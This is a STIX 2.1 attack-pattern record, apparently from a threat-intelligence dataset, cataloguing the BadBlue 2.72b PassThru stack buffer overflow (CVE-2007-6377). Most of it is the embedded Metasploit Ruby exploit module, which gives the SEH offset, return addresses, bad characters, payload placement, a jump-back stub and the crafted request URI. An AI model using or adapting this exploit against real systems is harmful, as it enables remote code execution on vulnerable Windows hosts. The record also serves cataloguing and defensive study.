{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72f8e8ee-c225-442b-9709-1bc20048d96e",
    "created": "2024-08-14T16:55:31.910308Z",
    "modified": "2024-08-14T16:55:31.910311Z",
    "name": "BadBlue 2.72b PassThru Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the PassThru functionality in ext.dll in BadBlue 2.72b and earlier. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/badblue_passthru.rb",
            "external_id": "badblue_passthru.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-6377"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  # NOTE: BadBlue doesn't give any HTTP headers when requesting '/'.\n  # However, a proper Server header is returned when requesting /index.html or using HEAD.\n  HttpFingerprint = { :method => 'HEAD', :pattern => [ /BadBlue\\// ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'BadBlue 2.72b PassThru Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the PassThru\n        functionality in ext.dll in BadBlue 2.72b and earlier.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2007-6377'],\n          ['OSVDB', '42416'],\n          ['BID', '26803'],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x0a\\x0b\\x0d\\x20\\x23\\x25\\x26\\x2b\\x2f\\x3a\\x3c\\x3d\\x3f\\x5c\",\n          'StackAdjustment' => -3500,\n          #'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'\t=>  'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # This is the version being distributed on badblue.com as of Jul 7th 2010\n          [ 'BadBlue EE 2.7 Universal', { 'Ret' => 0x10033f44 } ], # pop/pop/ret in ext.dll v1.0.0.1 (06a6dc81924ba94bfbbd00902d054db2)\n          [ 'BadBlue 2.72b Universal', { 'Ret' => 0x10033f44 } ]   # pop/pop/ret from ext.dll v1.0.0.1\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2007-12-10'))\n  end\n\n  def exploit\n    seh_offset = 4116\n    #sploit = Rex::Text.pattern_create(seh_offset)\n    sploit = rand_text(seh_offset)\n    # Need to jump over the nul byte\n    seh = Rex::Arch::X86.jmp_short(8) + rand_text(2) + [target.ret].pack('V')\n    sploit << seh\n\n    plen = payload.encoded.length\n    sploit[seh_offset - 16 - plen, plen] = payload.encoded\n\n    # This pointer will force a crash when it is used in a lock instruction\n    ptr = rand_text(3)\n    ptr << [0x80|rand(256)].pack('C')\n    sploit[seh_offset - 8,4] = ptr\n\n    # These two bytes get corrupted, so we can't use them.\n    sploit << rand_text(2)\n\n    # jump back to the payload\n    distance = 2 + 8 + 16 + plen\n    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{distance}\").encode_string\n\n\n    # Build the final URI\n    uri = \"/ext.dll?mfcisapicommand=PassThru&\"\n    uri << sploit\n\n    print_status(\"Trying target %s...\" % target.name)\n    send_request_raw({ 'uri' => uri }, 5)\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-12-10",
    "x_mitre_platforms": [
        "win'"
    ]
}